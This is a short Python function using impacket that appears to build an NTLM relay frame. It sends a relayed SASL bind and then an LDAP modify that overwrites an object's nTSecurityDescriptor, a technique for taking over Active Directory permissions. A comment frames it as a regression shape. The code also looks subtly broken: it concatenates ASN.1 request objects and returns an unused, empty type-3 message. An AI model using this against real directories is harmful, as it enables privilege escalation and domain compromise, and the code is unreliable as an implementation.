from impacket import ntlm
from impacket.ldap.ldap import LDAPConnection
from impacket.ldap.ldapasn1 import BindRequest, ModifyRequest


def relay_frame(conn, token, dn, value):
    # Minimal regression shape: one protected record holding a bind and a modify.
    type3 = ntlm.NTLMAuthChallengeResponse()
    bind_request = BindRequest()
    bind_request["authentication"]["sasl"]["mechanism"] = "GSS-SPNEGO"
    bind_request["authentication"]["sasl"]["credentials"] = token
    modify_request = ModifyRequest()
    modify_request["object"] = dn
    modify_request["changes"][0]["modification"]["type"] = "nTSecurityDescriptor"
    modify_request["changes"][0]["modification"]["vals"].setComponents(value)
    record = bind_request + modify_request
    wire = conn.encrypt(record)
    conn._socket.send(wire)
    return type3
